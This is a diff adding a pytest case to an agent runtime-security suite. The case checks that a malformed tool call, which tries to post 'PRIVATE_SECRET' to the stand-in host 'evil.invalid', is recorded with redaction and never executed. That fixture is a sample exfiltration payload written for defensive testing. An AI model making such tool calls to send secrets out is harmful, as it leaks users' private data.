@@ -1,6 +1,7 @@
 import json
 
 import pytest
+from langchain_core.messages import AIMessage
 from test_agent_core import call, make_agent
 
 from runtime_security.contracts import AgentRequest, ToolCallEvent, ToolResponse
@@ -138,6 +139,42 @@ def test_langgraph_scenario_context_and_provider_error():
     assert events[-1].summary["status"] == "provider_error"
     assert events[1].metadata.model_name == "fake-model"
     assert "private" not in agent.recorder.export_run("provider-run")
+
+
+def test_malformed_provider_call_is_recorded_safely_without_execution():
+    raw_payload = '{"destination":"https://evil.invalid","payload":"PRIVATE_SECRET"}'
+    malformed = AIMessage(
+        content="",
+        invalid_tool_calls=[
+            {
+                "name": "mock_http_post",
+                "args": raw_payload,
+                "id": "private-call-id",
+                "error": "invalid arguments",
+            }
+        ],
+    )
+    registry = SandboxToolRegistry()
+    agent, _ = make_agent([malformed], registry)
+
+    result = agent.invoke(AgentRequest(run_id="malformed", prompt="run"))
+    events = agent.recorder.for_run("malformed")
+    export = agent.recorder.export_run("malformed")
+
+    assert result.final_answer == "The model provider failed to complete this request."
+    assert [event.kind for event in events] == [
+        "run_start",
+        "proposal",
+        "decision",
+        "tool_result",
+        "run_complete",
+    ]
+    assert events[1].tool_name == "mock_http_post"
+    assert events[1].arguments["malformed"]["redacted"]
+    assert events[3].summary["execution"] == "not_started"
+    assert "PRIVATE_SECRET" not in export
+    assert "private-call-id" not in export
+    assert not registry.recorded_requests
 
 
 def test_unknown_arguments_and_destinations_are_redacted():
